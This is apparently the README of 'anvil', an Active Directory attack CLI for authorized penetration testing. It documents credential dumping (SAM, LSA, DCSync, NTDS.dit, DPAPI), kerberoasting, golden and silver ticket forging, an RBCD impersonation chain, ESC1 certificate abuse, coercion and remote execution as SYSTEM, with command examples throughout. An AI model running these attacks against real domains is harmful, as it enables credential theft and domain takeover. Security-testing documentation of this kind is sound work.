# anvil

anvil is an Active Directory recon and attack CLI built on Mandiant's
[gopacket](https://github.com/mandiant/gopacket) (Apache-2.0), a Go
reimplementation of Impacket. It ships as a single static binary with no
runtime dependencies, for Windows and Linux. SMB fingerprint packet
construction is adapted from gopacket's `tools/DumpNTLMInfo` (Apache-2.0).

**For authorized security testing only.**

## Features

- **Unauthenticated target profiling** (`anvil scan`) — AD port sweep; SMB
  dialect, signing, OS and NTLM fingerprint with clock-skew measurement;
  RPC endpoint dump annotated from a well-known UUID table with coercion
  hints (PrinterBug, PetitPotam, ShadowCoerce, DFSCoerce, PrintNightmare);
  LDAP signing and channel-binding posture; kerberos realm probe;
  null-session share check; TLS certificate harvest; AD CS web-enrollment
  (ESC8) detection. Probes are individually selectable (`--only`/`--skip`)
  and output is available as JSON. The shell continues the AD CS story:
  `adenum adcs` enumerates templates (ESC1 flagged) and `certreq` enrolls
  over MS-ICPR, enrollee-supplied SANs included.
- **Authenticated SMB shell** (`anvil connect`) — one persistent session for
  file management (including filtered search and resumable downloads),
  enumeration (users, groups, sessions, services, processes, named pipes,
  event logs), service and scheduled-task control, and remote registry
  read/write — with a write-op audit trail and session keepalive/reconnect.
- **Credential access** — SAM and LSA hive dumps, offline NTDS.dit
  extraction (VSS), DCSync over DRSUAPI, DPAPI Credential Manager
  decryption, GPP cpassword recovery. Hives are downloaded, decrypted
  locally, and cleaned up on both sides.
- **Kerberos** — kerberoast, AS-REP roast, golden/silver ticket forging
  (`anvil ticket`), S4U2Self + S4U2Proxy impersonation (`anvil getst`),
  ccache/kirbi inspection and conversion (`anvil describe`, `anvil
  convert`), and clock-skew correction for ccache auth (`--sync-clock`).
- **Remote execution** — four methods (Task Scheduler, temporary Windows
  service, WMI, DCOM shell objects) sharing one readback-and-verified-
  cleanup pattern.
- **AD write primitives** — machine accounts, RBCD, DACL and owner editing,
  password reset/change (LDAP and SAMR), group membership, registry writes,
  PortProxy relay rules.
- **Verified against real AD** — the full feature matrix is exercised
  against a live Windows Server 2022 DC; Samba-vs-Windows protocol
  differences are documented in this README and in source comments.

## Requirements

- Go 1.25+
- Pure Go, `CGO_ENABLED=0` — cross-compiles for Windows and Linux

## Build

```
make build        # ./anvil
go build ./cmd/anvil
```

Cross-compile both platforms into `dist/`:

```
make build-all    # dist/anvil-linux-amd64, dist/anvil-windows-amd64.exe
```

Other targets: `make test` (unit tests — hermetic, no lab needed), `make vet`,
`make fmt`, `make clean`.

### Windows version info

Windows builds embed version info and an application manifest (from
`versioninfo.json` / `anvil.manifest`) via the pinned
`goversioninfo` tool (`go get -tool` in go.mod, run as
`go tool goversioninfo`). `make windows-resource` regenerates
`cmd/anvil/resource_windows_amd64.syso`; `make build-windows` and
`make build-all` do it automatically. The `_windows_amd64` suffix means only
windows/amd64 builds link the resource.

## Usage

```
anvil scan <target> [flags]
```

`scan` profiles a target without credentials: TCP reachability of the AD port
set (dns, kerberos, msrpc, ldap, smb, ldaps, gc, rdp, winrm, ...), then
unauthenticated probes against open ports — SMB dialect/signing/OS/NTLM
fingerprint plus the server's clock skew from the SMB2 negotiate (|skew| over
five minutes breaks kerberos; `--sync-clock` fixes it at connect time), an
RPC endpoint mapper dump annotated from a built-in well-known-UUID table
(samr, lsarpc, drsuapi, svcctl, ... — with HINTS flagging exposed coercion
interfaces: MS-RPRN PrinterBug, MS-EFSR PetitPotam, MS-FSRVP ShadowCoerce,
MS-DFSNM DFSCoerce, MS-PAR PrintNightmare), LDAP posture (signing
requirement, LDAPS channel binding, root DSE — naming context, domain/forest
functional levels, SASL mechanisms, and the forest root derived from the
schema context), a kerberos realm probe (one AS-REQ for a deliberately
nonexistent principal; the KRB-ERROR reply confirms the KDC and carries the
realm — no lockout surface), and a null-session attempt (anonymous share
enumeration; a server that accepts the null logon is flagged even when
signing stops the enumeration there). Two service probes round it out: a
TLS certificate harvest (636/3389/5986 — subject CN, issuer, SANs, expiry;
certs are captured, not trust-validated) and an AD CS web-enrollment check
(an unauthenticated GET of `/certsrv/` — a 401 challenging with NTLM marks
the ESC8 relay target; an anonymous 200 is called out too). 80/443 joined
the default port set for this. Two more round out the service intel: an
MSSQL prelogin probe (1433 — server version from the TDS token stream and
whether encryption is required) and an RDP NLA check (3389 — X.224
negotiation shows whether CredSSP is enforced).

Flags:

- `--ports 53,88,445` — comma-separated TCP ports (default: AD port set)
- `--only smb,ldap` — run only these probes (`smb`, `rpc`, `ldap`, `krb`,
  `nullsession`, `tls`, `adcs`, `tds`, `rdp`)
- `--skip nullsession,krb` — run all probes except these (mutually
  exclusive with `--only`)
- `--timeout 3s` — per-connection timeout
- `--json` — machine-readable output, no color

The phase-1 port sweep always runs; probe selection filters phase 2 on
top of it — a probe fires only when its port is open and it is selected.

Examples:

```
anvil scan 192.168.10.5
anvil scan dc01.corp.local --timeout 5s
anvil scan 192.168.10.5 --ports 88,389,445,636 --json
```

### `anvil connect`

```
anvil connect --host <ip|hostname> [flags]
```

Opens an authenticated SMB session and drops into an interactive shell —
one connection stays open for the whole session. Shell commands, by
category:

- **Files**: `use <share>`, `ls [path]`, `cd <path>`, `pwd`,
  `get <remote> [local]`,
  `put <local> [remote]`, `rm <path>`, `mkdir <path>`, `rmdir <path>`,
  `rename <old> <new>`, `cat <path>` (up to 8 MiB; use `get` for
  larger), `find [start] [filters]` (recursive search),
  `download <remote> <local> [--resume]` (resumable)
- **Enumeration**: `shares` (per-share access, see below), `sessions`,
  `users`, `groups`, `members <group>`, `services`, `loggedon`, `time`
  (server clock and uptime), `procs` (process list without WMI),
  `enumpipes`, `lookupsid [startRID] [endRID]`,
  `adenum [users|computers|delegation|laps|adcs]`,
  `eventlog list|query <log>`, `whoami` (session user, SID, and full
  group memberships), `trusts` (domain trust relationships)
- **Registry** (winreg): `reg query`, `reg save`, `reg set`,
  `reg delvalue`, `reg createkey`, `reg delkey`, `reg search`,
  `portfwd list|add|remove|clear` (PortProxy relay rules)
- **Services & tasks**: `svc <start|stop|config> <name> [type]`,
  `tasks`, `taskshow`, `taskrun`, `taskdel`
- **Credential access**: `samdump`, `lsadump`, `dcsync`, `ntdsdump`,
  `dpapi`, `gpp`
- **Roasting**: `kerberoast`, `asrep`
- **Execution**: `exec` (Task Scheduler), `psexec` (temporary service),
  `wmiexec` / `wmiquery <WQL>` (WMI/DCOM), `dcomexec` (DCOM shell
  objects)
- **AD writes**: `addcomputer <name> [-pass x]` / `delcomputer <name>`,
  `changepasswd <user> <new> [old]`, `sampasswd <user> <new> <old>`,
  `samadd` / `samdel <group> <user>`, `rbcd get|set|clear`, `dacledit`,
  `owneredit`, `certreq <template> [-san <upn>]` (certificate enrollment)
- **Ticket attacks**: `badsuccessor [enum|keys <dmsa$>]`,
  `raisechild <child-krbtgt-hash> [out]`, `certreq <template> [-san <upn>]`
  (certificate enrollment), `coerce <method> <ip> <port>` (machine-account
  coercion with a callback listener)
- **Session**: `loot [dir]` (loot directory for `--out` files),
  `changes [--save] [--clear]` (write-op audit trail),
  `ping`, `reconnect`, `! <cmd>` (local shell; `!<n>` re-runs entry n),
  `help`, `exit`/`quit`

The credential-access commands (`samdump`, `lsadump`, `dcsync`,
`ntdsdump`) and the roasting commands (`kerberoast`, `asrep`) accept
`--out <file>`: the hashcat/secretsdump lines are written to the file in
addition to the screen. A bare filename lands in the session loot
directory (`loot <dir>`, default `~/.anvil/loot/<host>/`).

`gpp` walks SYSVOL on the existing session for GPP XML files
(Groups/Services/ScheduledTasks/DataSources/Printers/Drives and anything
else carrying `cpassword`), extracts each `cpassword` and its `userName`,
and decrypts with Microsoft's published AES-256 key (zero IV, PKCS7).
Output is USERNAME / SECRET / SOURCE rows; undecryptable blobs are warm
warnings.

`rbcd` edits the `msDS-AllowedToActOnBehalfOfOtherIdentity` security
descriptor: `rbcd get dc01$` lists who may impersonate users on a host,
`rbcd set dc01$ ANVPC$` grants it, `rbcd clear dc01$` wipes it. Setting or
clearing needs write rights on the target's SD (typically Domain Admin);
each op uses one transient LDAP channel. On Samba's lab DC the attribute
is system-only, so writes are refused with a clean themed error.

`dacledit` reads and edits any AD object's DACL over one transient LDAP
channel — bare `dacledit <target>` lists ACEs (trustee, rights,
inheritance, object type), `-p <user> -grant <rights>` adds an ACE, and
`-p <user> -revoke [rights]` removes them. Rights presets cover the
classic escalation primitives (`RightsPresetNames`: dcsync, fullcontrol,
genericall, resetpassword, writedacl, writemembers, writeowner). Only the
touched SD portion is written, and Server 2022's DACL canonicalization
(GENERIC_ALL stored as FULL_CONTROL) is accounted for.
`owneredit <target> [-set <user>]` reads or sets the object owner (write
needs WriteOwner).

### The RBCD chain

`anvil getst` completes the chain — S4U2Self + S4U2Proxy service-ticket
request as an allowed account, written as a ccache for `connect -k`:

```
anvil connect --host dc01.corp.local -u admin -p 'pw' -d CORP
  addcomputer ANVX -pass 'Str0ng!PC#2026'   # machine account
  rbcd set DC01$ ANVX$                      # ANVX$ may impersonate on DC01
  exit
anvil getst -spn cifs/dc01.corp.local -impersonate Administrator \
  -u 'ANVX$' -p 'Str0ng!PC#2026' -d corp.local
KRB5CCNAME=Administrator@cifs_dc01.corp.local.ccache \
  anvil connect -k --host dc01.corp.local
```

`getst` needs the SPN (`-spn`), the user to impersonate (`-impersonate`),
the requesting account (`-u`/`-p` or `--hashes`), and the DNS realm (`-d`);
`--dc-ip` overrides the KDC address. As with any `-k` connect, when DNS
can't resolve the FQDN pass `--target-ip` as well. Denials are themed (no
constrained-delegation rights vs. delegation not allowed).

`badsuccessor` implements the BadSuccessor attack (CVE-2025-53779) against
domains with a Windows Server 2025 DC: `badsuccessor enum` lists dMSA
objects (migration state, superseded link, key-retrieval principals) over
one transient LDAP channel, and `badsuccessor keys <dmsa$>` runs the
KERB-SUPERSEDED path — a dMSA TGT whose PAC inherits the superseded
account's privileges plus the KERB-DMSA-KEY-PACKAGE with the superseded
account's keys. Request construction is byte-compatible with impacket's;
on pre-2025 domains both modes cleanly report the missing dMSA schema.

`raisechild <child-krbtgt-hash> [out.ccache]` is the child→forest-root
escalation: a golden ticket forged in a child domain carrying the
forest-root Enterprise Admins SID in its PAC SIDHistory (parent-child
trusts pass it unfiltered). It verifies the connected domain really is a
child (one transient LDAP channel), then forges offline. In a
single-domain forest it says so and forges nothing. The follow-on
cross-realm legs (TGS-REQ, parent dcsync) are not yet wired.

`kerberoast` needs any authenticated domain user. It uses two transient
channels (announced on screen): LDAP for the SPN lookup
(`(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))`),
and the KDC for one RC4 TGS per SPN — hashes print in hashcat format
(`$krb5tgs$23$*user$realm$spn*$checksum$data`). The LDAP channel uses a
simple bind over 389 (allowed by default on Windows DCs; pass-the-hash
uses an NTLM bind instead).

`asrep` (AS-REP roasting) needs any authenticated domain user for the LDAP
lookup. It uses the same two transient channels (announced on screen):
LDAP to find users with DONT_REQ_PREAUTH set
(`(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))`),
and the KDC for one RC4 AS-REQ per user — no credentials needed for the
KDC half, since the KDC answers AS-REQs for these accounts without
pre-authentication. Hashes print in hashcat format
(`$krb5asrep$23$user@REALM:checksum$data`).

`adenum` enumerates the domain over LDAP. It needs any authenticated domain
user (a DA for `laps` — LAPS passwords are only readable by privileged
accounts) and uses one transient LDAP channel per invocation (announced on
screen; same simple-bind pattern as the roast commands), leaving the SMB
session untouched. Bare `adenum` defaults to `users`. Four modes:

- `users` — domain users with display name, adminCount, and the
  pwdLastSet / lastLogon timestamps (adminCount=1 flags accounts with
  protected-group privilege; lastLogon is not replicated, so it reflects
  this DC only)
- `computers` — computer accounts with DNS host name and OS version
- `delegation` — delegation relationships: unconstrained (UAC
  TRUSTED_FOR_DELEGATION, highlighted — the trusted host receives any
  user's TGT), constrained (msDS-AllowedToDelegateTo, with or without
  protocol transition), and resource-based
  (msDS-AllowedToActOnBehalfOfOtherIdentity)
- `laps` — hosts with a readable LAPS-managed local admin password
  (ms-Mcs-AdmPwd / msLAPS-Password) and its expiry

`certreq <template> [-cn <name>] [-san <upn>] [-ca <host\CA-Name>]`
`[-out <file.pem>]` requests a certificate from the domain's enterprise CA
over MS-ICPR — the enrollment RPC interface on the session's `\pipe\cert`
named pipe, so the only extra channel is one transient LDAP lookup
(announced) for CA discovery: with no `-ca`, the CA is found in the
configuration NC's enrollment services (`pKIEnrollmentService` objects);
`-ca` pins a specific `host\CA-Name`. The template is named twice per
MS-WCCE — in the generated CSR's certificate-template extension and in
the request's `CertificateTemplate` attribute. The ESC1 pairing:
`adenum adcs` flags templates carrying ENROLLEE_SUPPLIES_SUBJECT (the
ESC1 condition), and `certreq <template> -san victim@corp.local` exploits
exactly that — the CA issues a certificate whose SAN names any principal
the enrollee chooses, announced by the
`SAN: <upn> (enrollee-supplied subject)` line before `issued:` prints.
`-out` receives the issued certificate plus its freshly generated private
key as PEM — no PKCS#12; convert afterwards with
`openssl pkcs12 -export -out user.pfx -inkey key.pem -in cert.pem`. On a
server with no enrollment pipe (the Samba lab) the open fails with
`error: no certificate enrollment on this server (no cert pipe)` and the
session survives; issuance itself (baseline User cert, ESC1 SAN cert) is
verified manually against the Windows Server 2022 CA.

`coerce <method> <listen-ip> <port>` fires a machine-account coercion
trigger and proves it with a built-in callback listener: anvil binds
`:port`, delivers the RPC, and reports whether the target's machine
account connected back within 10 seconds. Methods: `printerbug`
(MS-RPRN RpcRemoteFindFirstPrinterChangeNotificationEx — works as any
authenticated user on stock Windows), `petitpotam` (MS-EFSR
EfsRpcOpenFileRaw — patched to require admin on current Windows),
`shadowcoerce` (MS-FSRVP IsPathSupported — needs the File Server VSS
Agent service, disabled by default on many servers), and `dfscoerce`
(MS-DFSNM NetrDfsAddStdRoot + cleanup — admin-restricted). Each
surfaces its own themed denial when the server refuses. Note the
callback always lands on the listener's SMB port (445), so a Windows
operator box sees it in its own SMB server rather than the anvil
listener; a loopback listener on the target (127.0.0.1) proves the
callback in the target's own session list — `DC01$ from 127.0.0.1`.

`lookupsid [startRID] [endRID]` brute-forces account names by RID over the
session's lsarpc pipe (MS-LSAT LsarLookupSids): resolves the domain SID,
then sweeps the inclusive range (default 500–4000) in 64-SID batches,
printing RID, `DOMAIN\name`, and SID type — every account, group, and
machine in the domain in a fraction of a second against a Windows DC.
Read-only; any authenticated session works.

`addcomputer` creates the machine account over SAMR (existing session) and
sets dNSHostName + kerberos SPNs over one transient LDAP channel
(announced); without `-pass` a random 32-char password is generated and
printed once. Any authenticated user can typically create up to 10 machine
accounts (MS-DS-Machine-Account-Quota; Samba's lab DC denies non-admin
creation by default). `delcomputer` deletes the computer object via LDAP
(admin required).

`changepasswd <user> <new> [old]` writes the `unicodePwd` attribute over
one transient LDAPS channel (announced; falls back to plain LDAP when the
TLS handshake fails — e.g. Samba certs Go's x509 parser rejects). With two
arguments it is an admin reset (replace the password outright, needs reset
rights); with the old password given it is a user change (delete old + add
new in one modify request, per MS-ADTS 3.1.1.3.1.5). Both paths are
verified against Windows Server 2022 — note a change counts as a *change*
(not a reset) for policy, so the domain's minimum password age applies to
it. Rejections are themed by Win32 code: 00000056 means the old password
was wrong, 0000052D means policy (complexity/history/minimum age) or an
old-password mismatch.

`sampasswd <user> <new> <old>` changes a password entirely over the SMB
session (SamrUnicodeChangePasswordUser2) — no LDAP/LDAPS and no admin
rights needed, so it works when 389/636 are filtered; it always needs the
old password and enforces domain policy (including history), where the
`changepasswd` admin reset bypasses it. (gopacket's SAMR admin reset —
SetInformationUser level 18 — corrupts accounts on Server 2022, so it is
deliberately not wired.) `samadd <group> <user>` / `samdel <group> <user>`
edit membership of domain groups and Builtin aliases (e.g. Remote Desktop
Users) via SAMR, also over the existing session.

`dcsync` requires Domain Admins or Replicating Directory Changes rights.
DRSUAPI has no SMB named-pipe endpoint, so it necessarily opens ONE extra
RPC-over-TCP channel (epmapper lookup + dynamic port, opened and closed
once per invocation — announced on screen) while the SMB session stays
untouched. Output is secretsdump format: `DOMAIN\user:RID:lm:nt:::`.

`samdump` requires admin on the target. It saves the SAM and SYSTEM hives
on the target (`C:\Windows\Temp\anv-*.tmp`), downloads them over the same
session, parses and decrypts **locally** (bootkey + RC4/DES via gopacket's
pkg/registry), prints `user:RID:lm:nt:::` lines to stdout, then deletes
the remote files and the local temp dir — hives never persist and any
undeleted leftover is named in a warning. `lsadump` does the same with the
SECURITY hive (plus SYSTEM for the bootkey), printing cached logons as
`DOMAIN/user:hash` and secrets in secretsdump format.

`ntdsdump` requires admin on a domain controller. It creates a VSS shadow
copy of `C:` (`vssadmin create shadow /for=C:` via `exec` as SYSTEM, with a
`wmic shadowcopy call create` fallback), copies `ntds.dit` and the SYSTEM
hive out of the shadow into `C:\Windows\Temp\anv-*.tmp`, downloads them
over the same session, and parses and decrypts **locally** (bootkey from
SYSTEM, then the PEK and the per-user NT/LM hashes from the ESE database
via gopacket's pkg/ese + pkg/registry), printing secretsdump-format
`DOMAIN\user:RID:lm:nt:::` lines. The shadow copy (verified via
`vssadmin list shadows`), the remote temp files, and the local temp dir are
all deleted afterwards — any leftover is named in a warning. The domain
prefix comes from the session's `-d` domain, falling back to the NTLM
challenge's DNS tree name; the NTDS.dit path is the default
`C:\Windows\NTDS\ntds.dit`. Two caveats: only `ntds.dit` itself is copied
(no `edb.log`/`edb.chk` replay), so the dump reflects the directory as of
the last ESE flush — accounts created minutes earlier may be missing (this
matches impacket's VSS behavior); and domain group accounts print too with
the empty NT hash, so the account count runs higher than impacket's.

`dpapi` requires admin on the target. It reuses the lsadump flow (save +
download + delete the SECURITY and SYSTEM hives) to recover the
DPAPI_SYSTEM machine/user masterkeys, then fetches every blob under
`C$\Users\*\AppData\{Roaming,Local}\Microsoft\Credentials` over the same
session and decrypts locally (blob parsing via gopacket's pkg/dpapi; the
decryption itself lives in anvil's internal/dpapi). Output is aligned
TARGET / USERNAME / SECRET rows; blobs that fail to decrypt are warm
warnings, not errors. Regular interactive users' blobs are covered too:
masterkey files that DPAPI_SYSTEM can't open are retried with keys derived
from the session's own credentials (the connected user's password, or NT
hash with pass-the-hash), so dumping as alice recovers alice's own
Credential Manager secrets; kerberos-only sessions carry no password/hash
and get only the DPAPI_SYSTEM-covered blobs.

`reg save` writes on the **target's** filesystem (absolute Windows path
required, e.g. `reg save HKLM\SAM C:\Windows\Temp\sam.save`); download the
file afterwards with `use C$` + `get Windows\Temp\sam.save`. Saving SAM,
SECURITY, or full hives needs admin with backup privilege on the target.

Example: `reg query HKLM\SOFTWARE\Microsoft` lists subkeys and values;
`reg query HKLM\SYSTEM\CurrentControlSet\Control /v CurrentVersion` reads
one value with type and data (SZ/MULTI_SZ/DWORD/QWORD rendered as text,
BINARY as capped hex). Quote key paths containing spaces (`reg query
"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion"`) — surplus arguments
are rejected rather than silently querying a truncated path. HKCC is not
supported (no `OpenCurrentConfig` in gopacket's winreg).

`shares` shows smbmap-style access per share: tree connect + directory read
for READ, and a WRITE probe that briefly creates and deletes a tiny
uniquely-named file (`anv-<rand>.tmp`) at the share root (like smbmap).
Probing never changes the currently selected share. Caveat: on a Windows
DC's SYSVOL the stock ACL grants Administrators create/write but not delete
at the share root, so the probe file cannot be removed there — anvil names
the leftover (`left anv-<rand>.tmp`) and moves on; delete it target-side
(e.g. `exec cmd /c del C:\Windows\SYSVOL\sysvol\anv-*.tmp`, which runs as
SYSTEM).

`exec` runs a single command on the target via a temporary scheduled task
(TSCH, atexec-style): the task `anv-<rand>` runs `cmd.exe /C <cmd>` with
output redirected to `%windir%\Temp`, which is read back over the same
session; task and file are then deleted (verified, with warnings on
leftovers). Caveats: requires a local admin on the target, is noisy in
Windows event logs (task registration/run — 4698/4699), and waits at most
15s for output.

Four execution methods share the same readback-and-verified-cleanup
pattern, so pick what the target allows: `exec` (TSCH, runs as SYSTEM),
`psexec` (a temporary, uniquely-named Windows service over SVCCTL — runs
as SYSTEM; the service runs a self-deleting batch because a service binary
path cannot redirect output), `wmiexec` (`Win32_Process.Create` over one
transient DCOM channel — runs as the connected user, quieter in logs), and
`dcomexec` (ShellWindows → ShellBrowserWindow → MMC20 fallback). DCOM needs
TCP/135 plus the dynamic RPC port range, and hardened servers refuse
remote activation of the GUI-hosted classes (impacket behaves identically
there) — anvil reports the per-object failure and points at the working
alternative. All four take the remainder of the line verbatim, quotes
included. `wmiquery <WQL>` runs WQL against `root\cimv2` over the same WMI
channel and prints a table (e.g. `wmiquery SELECT Name, State FROM
Win32_Service`).

`svc` controls services over SVCCTL (admin on the target): `svc start` /
`svc stop <name>` waits for the state transition, `svc config <name>`
prints start type and state, and `svc config <name> disabled|demand|auto`
changes the start type. `tasks` lists scheduled tasks (path, state,
enabled) over the same TSCH pipe `exec` uses — with the same admin
requirement and the same Samba denial; `taskshow <path>` prints the
task's XML, `taskrun <path>` runs it, `taskdel <path>` deletes it.

`time` prints the server's clock, zone offset, and uptime from srvsvc's
NetrRemoteTOD (Samba reports tod_msecs=0, so lab uptime reads 0s).
`procs` lists processes without WMI: the Process performance-counter
family is read over the session's winreg pipe — the same channel
Sysinternals PsList uses — with counter indexes resolved from the
target's title database (the kernel PerfOS registration constants as
fallback). Read-only and world-readable; any authenticated session works.
`enumpipes` lists named pipes as the union of three sources on the same
session: the IPC$ NPFS listing, an endpoint-mapper lookup, and
CREATE-probes of well-known names — the probes are load-bearing on
modern Windows, where the RPC runtime answers `\pipe\samr` & co. without
materializing them in either listing. Each pipe is categorized against a
built-in database (admin/file/system/database/...), and a probe answered
with access denied is reported as such — the pipe exists and rejects
your credentials, which is itself recon signal.

Registry writes ride the winreg pipe too:
`reg set <key> <value> <type> <data>` (types REG_SZ, REG_EXPAND_SZ,
REG_BINARY as hex, REG_DWORD, REG_QWORD, REG_MULTI_SZ as `a|b|c`),
`reg delvalue <key> <value>`, `reg createkey <key>` (creates missing
parents), `reg delkey <key>` (must have no subkeys), and
`reg search <root> <pattern> [maxdepth] [limit]` over key and value
names. `portfwd` edits the PortProxy v4tov4 relay store
(`HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp`) in
exactly the layout `netsh interface portproxy` writes: `portfwd list`,
`portfwd add <listen host:port> <connect host:port>`,
`portfwd remove <listen>`, `portfwd clear`. Plain add/remove is
registry-only — rules activate after an iphlpsvc restart or reboot and
persist until removed, and the change tracker (below) keeps them
visible. `portfwd add --activate` takes a rule live immediately: after
the registry write it checks the target's IPv6 stack over winreg
(`DisabledComponents`), adds an inbound Windows Firewall rule named
`anv-portfwd-<port>` via the exec channel, and restarts iphlpsvc. Each
step prints one line and a failure never aborts the session — the
warning names the manual fix (a ready-made netsh command for the
firewall step, a service restart or reboot for iphlpsvc). The IPv6
check matters because portproxy rules are inert when IPv6 is disabled
(`DisabledComponents=0xff`) — netsh itself won't tell you.
`portfwd remove --deactivate` unwinds the chain: the rule is removed,
the firewall rule deleted, iphlpsvc restarted. On Samba the registry
write lands but every activation step fails with a themed warning (no
Tcpip6 key, no atsvc for the exec channel, no iphlpsvc service) and
the session carries on. Any winreg consumer lazily starts the target's
RemoteRegistry service if it is demand-stopped and restores its prior
state when the shell exits.

`find` walks the selected share recursively (start path defaults to the
current remote directory) with filters: `-name <glob>` or `-regex <re>`
against the base name (`-i` folds case), `-size [+|-|=]N<B|KB|MB|GB>`,
`-newer N` / `-older N` (mtime in days), `-type file|dir`, `-maxdepth N`,
`-limit N`, `-timeout 60s`. Unreadable subdirectories (System Volume
Information, junctions) are skipped, and a timeout returns the partial
results with a warning. `download <remote> <local>` pulls a file in
64 KiB chunks with resumable state under `~/.anvil/downloads/`:
`--resume` continues an interrupted pull (the remote size and mtime must
still match), `--restart` discards saved state.

`eventlog list` shows the target's event logs; `eventlog query <log>`
takes filters (`--minutes N`, `--id N`, `--type t`, `--source s`,
`--contains x`, `--limit n`) and reads them (wevtutil's XML parsed
locally). wevtutil runs over the
exec channel, so `eventlog` inherits `exec`'s admin requirement — and
its Samba denial.

The shell tracks every remote mutation it attempts — file ops (`put`,
`rm`, `mkdir`, `rmdir`, `rename`), the exec family, registry writes,
`svc`/`tasks`/`portfwd`, and the AD write primitives — with
success/failure. `changes` prints the audit table, `changes --save`
writes it as JSON under `~/.anvil/logs/changes/`, and a summary prints
when the shell exits. `ping` probes session liveness (a srvsvc share
enum; SMB2 has no echo op) and `reconnect` re-dials with the original
connect parameters, re-attaching the selected share. After five idle
minutes the next command pings first — the check is piggybacked on
command dispatch, so the connection is never touched concurrently.
`! <cmd>` runs a local command; `!<n>` re-runs history entry n.

| flag | short | default | meaning |
|---|---|---|---|
| `--host` | | (required) | target IP or hostname |
| `--port` | | `445` | SMB port |
| `--user` | `-u` | | username |
| `--password` | `-p` | | password (hidden prompt if `-u` given without `-p`) |
| `--domain` | `-d` | | domain |
| `--hashes` | | | `LMHASH:NTHASH` pass-the-hash |
| `--kerberos` | `-k` | | kerberos via ccache (`KRB5CCNAME` or `<user>.ccache`) |
| `--target-ip` | | | connect via this IP while keeping `--host` as the SPN name |
| `--dc-ip` | | | KDC address override for kerberos |
| `--dc-host` | | | DC hostname override for kerberos |
| `--sync-clock` | | | measure NTP offset vs the DC and stamp kerberos authenticators with server time (with `-k`) |
| `--transcript` | | | record all session output to this file as well as the terminal |

No credentials at all attempts a null session. Windows refuses anonymous
SMB session setup outright (themed error, non-zero exit); Samba's lab DC
accepts the session and then denies each operation, which is why the e2e
suite can exercise the null-session shell. The persistent `--timeout`
flag applies.

### Kerberos

Mint a TGT first — `getTGT` (gopacket) or `kinit` — then point anvil at
the ccache. The realm must be DNS-form (`LAB.LOCAL`, not NetBIOS); when a
ccache is present its realm drives the exchange, otherwise `--domain` is
the fallback. `--host` must be the FQDN (the SPN is `cifs/<host>`); use
`--target-ip` when DNS can't resolve it:

```
KRB5CCNAME=/tmp/alice.ccache anvil connect --host dc01.lab.local -k -u alice -d LAB.LOCAL
anvil connect --host dc01.lab.local --target-ip 10.0.0.5 -k -u alice -d LAB.LOCAL
```

Kerberos sessions negotiate SMB 3.0.2 (the smb2 library's 3.1.1 preauth
hash mishandles the kerberos immediate-auth leg — pinning keeps signing
correct on all servers).

A skewed client clock fails the KDC's and the service's ±5-minute
authenticator checks. `--sync-clock` (with `-k`) measures the offset over
NTP against the DC (`--dc-ip` when set, else `--host`) before connecting,
prints it, and stamps authenticators with server time; reply-verification
tolerance is widened past the measured offset so valid KDC replies still
check out. It covers ccache flows (golden/silver tickets — the case skew
actually breaks); password-based `-k` builds its AS exchange inside the
library, which has no clock hook, so that path declines to stock
behavior.

Examples:

```
anvil connect --host 192.168.10.5 -u alice -p 's3cret' -d CORP
anvil connect --host dc01.corp.local -u alice            # password prompt
anvil connect --host 192.168.10.5 --hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

Scripted (non-interactive) use works by piping commands on stdin:

```
printf 'use ANVIL\nls\nexit\n' | anvil connect --host 192.168.10.5 -u alice -p 's3cret'
```

When scripting paths with backslashes, mind your shell's escape processing:
`printf '...'` interprets `\a \b \t ...` in its format string and will
mangle SMB paths — use `printf '%s\n' 'line1' 'line2'` instead.

Color output follows the NO_COLOR convention and is disabled automatically
when output is not a terminal. Colors come from the
[Terminal Workbench](https://github.com/Real-Fruit-Snacks/terminal-workbench-design-system)
design system: the dark palette is the default, and the light palette is
selected when `ANVIL_THEME=light` or when `COLORFGBG` reports a light
background (7 or 15). `ANVIL_THEME=dark` forces the dark palette.

### `anvil ticket`

```
anvil ticket -krbtgt <nthash> -domain <dns-domain> -domain-sid <S-1-5-21-...> -user <username> [-out path]
anvil ticket -nthash <nthash> -spn <service/fqdn> -domain <dns-domain> -domain-sid <S-1-5-21-...> -user <username> [-out path]
```

Forges a **golden ticket** — a TGT for any user, signed and encrypted with
the domain's krbtgt key. A KDC trusts any TGT encrypted with its own
krbtgt key, so whoever holds that key can mint valid tickets for arbitrary
users without ever talking to the KDC; forging is fully offline. The
krbtgt NT hash comes from `dcsync` (the `krbtgt` account's NT hash), and
the domain SID from standard domain enumeration. The forged PAC carries
the default high-privilege group set (Domain Admins, Enterprise Admins,
Schema Admins, ...) and a ~10-year lifetime, matching impacket's ticketer
defaults.

With `-nthash` + `-spn` instead of `-krbtgt`, anvil forges a **silver
ticket**: a service ticket for one SPN, encrypted with that machine or
service account's NT hash (e.g. the `dc01$` machine account hash from
`dcsync`). Where a golden ticket is a skeleton key — one TGT the KDC will
exchange for any service — a silver ticket opens exactly one service on
one host, and the KDC is never involved at all: no AS-REQ, no TGS-REQ,
nothing logged on the DC. The trade-off is scope (one SPN, and only
services that validate the PAC against their own key) and exposure (the
service's own event logs still see the logon). Exactly one of
`-krbtgt`/`-nthash` is required, and `-spn` (`cifs/dc01.lab.local`,
`http/web.corp.local`, ...) is required with `-nthash` and rejected with
`-krbtgt`.

The ticket is written as a ccache — default `<user>.ccache` in the current
directory, or `-out <path>` — and consumed exactly like a real TGT (see
Kerberos above):

```
$ anvil ticket -krbtgt 31d6cfe0d16ae931b73c59d7e0c089c0 -domain lab.local \
    -domain-sid S-1-5-21-1004336348-1177238915-682003330 -user Administrator
GOLDEN TICKET  Administrator@LAB.LOCAL
  ccache         Administrator.ccache
use: KRB5CCNAME=Administrator.ccache anvil connect -k -u Administrator -d LAB.LOCAL --host <fqdn>

$ anvil ticket -nthash 31d6cfe0d16ae931b73c59d7e0c089c0 -spn cifs/dc01.lab.local \
    -domain lab.local -domain-sid S-1-5-21-1004336348-1177238915-682003330 -user Administrator
SILVER TICKET  Administrator@LAB.LOCAL -> cifs/dc01.lab.local
  ccache         Administrator.ccache
use: KRB5CCNAME=Administrator.ccache anvil connect -k -u Administrator -d LAB.LOCAL --host dc01.lab.local

